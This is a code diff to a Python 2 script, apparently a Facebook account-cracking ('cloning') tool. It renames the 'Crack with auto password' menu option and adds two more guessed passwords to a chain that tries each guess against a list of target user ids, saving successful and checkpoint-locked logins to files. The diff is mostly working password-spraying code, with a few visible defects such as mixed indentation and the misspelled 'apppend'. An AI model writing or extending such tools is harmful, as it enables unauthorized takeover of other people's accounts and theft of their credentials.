@@ -305,7 +305,7 @@ def menu():
     print ''
     print ' ------------------------------------------ '
     print ''
-    print '\033[1;92m[1] Crack with auto password' 
+    print '\033[1;92m[1] Start Cloning' 
     print '\033[1;92m[2] Extract Link For File' 
     print '\033[1;92m[3] View token'
     print '\033[1;92m[4] Logout'
@@ -406,7 +406,9 @@ def a_s():
         pass7 = raw_input(' \033[1;92m[7]Password: ')
         pass8 = raw_input(' \033[1;92m[8]Password: ')
 	pass9 = raw_input(' \033[1;92m[9]Password: ')
-	pass10 = raw_input(' \033[1;92m[10]Password: ')
+	pass10 = raw_input('\033[1;92m[10]Password: ')
+	pass11 = raw_input('\033[1;92m[11]Password: ')
+	pass12 = raw_input('\033[1;92m[12]Password: ')
         idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
@@ -451,7 +453,9 @@ def a_s():
         pass7 = raw_input(' \033[1;92m[7]Password: ')
         pass8 = raw_input(' \033[1;92m[8]Password: ')
 	pass9 = raw_input(' \033[1;92m[9]Password: ')
-	pass10 = raw_input(' \033[1;92m[10]Password: ')
+	pass10 = raw_input('\033[1;92m[10]Password: ')
+	pass11 = raw_input('\033[1;92m[11]Password: ')
+	pass12 = raw_input('\033[1;92m[12]Password: ')
         idt = raw_input(' \033[1;93m[★]Enter id: ')
         
         try:
@@ -495,7 +499,9 @@ def a_s():
         pass7 = raw_input(' \033[1;92m[7]Password: ')
         pass8 = raw_input(' \033[1;92m[8]Password: ')
 	pass9 = raw_input(' \033[1;92m[9]Password: ')
-	pass10 = raw_input(' \033[1;92m[10]Password: ')
+	pass10 = raw_input('\033[1;92m[10]Password: ')
+	pass11 = raw_input('\033[1;92m[11]Password: ')
+	pass12 = raw_input('\033[1;92m[12]Password: ')
         
         try:
 	    idlist= raw_input('[+] File Name: ')
@@ -682,6 +688,36 @@ def a_s():
                                                     cp.write(uid + ' | ' + pass10 + '\n')
                                                     cp.close()
                                                     cps.apppend(uid + pass10)
+						else:
+                                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass11, headers = header).text
+                                                    q = json.loads(data)
+                                                    if 'loc' in q:
+                                                        print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass11
+                                                        ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                                                        ok.write(uid + ' | ' + pass11 + '\n')
+                                                        ok.close()
+                                                        oks.append(uid + pass11)
+                                                    elif 'www.facebook.com' in q['error']:
+                                                        print '\x1b[1;97m[JAM-CP] ' + uid + ' | ' + pass11
+                                                        cp = open('HOP_CP.txt', 'a')
+                                                        cp.write(uid + ' | ' + pass11 + '\n')
+                                                        cp.close()
+                                                        cps.apppend(uid + pass11)
+						    else:
+                                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass12, headers = header).text
+                                                        q = json.loads(data)
+                                                        if 'loc' in q:
+                                                            print '\033[1;92m[JAM-OK] ' + uid + ' | ' + pass12
+                                                            ok = open('/sdcard/ids/HOP_OK.txt', 'a')
+                                                            ok.write(uid + ' | ' + pass12 + '\n')
+                                                            ok.close()
+                                                            oks.append(uid + pass12)
+                                                        elif 'www.facebook.com' in q['error']:
+                                                            print '\x1b[1;97m[JAM-CP] ' + uid + ' | ' + pass12
+                                                            cp = open('HOP_CP.txt', 'a')
+                                                            cp.write(uid + ' | ' + pass12 + '\n')
+                                                            cp.close()
+                                                            cps.apppend(uid + pass12)
         except:
             pass
         
